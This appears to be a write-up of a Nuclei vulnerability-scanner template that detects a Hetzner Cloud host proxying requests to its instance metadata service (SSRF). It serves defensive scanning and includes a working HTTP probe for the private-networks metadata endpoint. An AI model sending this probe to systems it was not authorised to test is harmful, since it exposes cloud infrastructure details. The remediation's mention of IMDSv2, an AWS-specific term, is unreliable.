# Nuclei Template: Hetzner Cloud Metadata Service Check
**Template ID:** metadata-service-hetzner
**Vulnerability Class:** Server-Side Request Forgery (SSRF)
**Severity:** Critical
**CWE:** CWE-441
**Source:** Nuclei Template (`metadata-hetzner.yaml`)

## Vulnerability Information & PoC

## Description
The Hetzner Cloud host is configured as a proxy which allows access to the instance metadata service. This could allow significant access to the host/infrastructure.

## Steps to reproduce / Exploit Payload
```http
GET http://{{hostval}}/v1/metadata/private-networks HTTP/1.1
Host: {{hostval}}
```

## Remediation
Disable the proxy or restrict configuration to only allow access to approved hosts/ports. Upgrade to IMDSv2 if possible.

## References
- https://docs.hetzner.cloud/#server-metadata
- https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
- https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
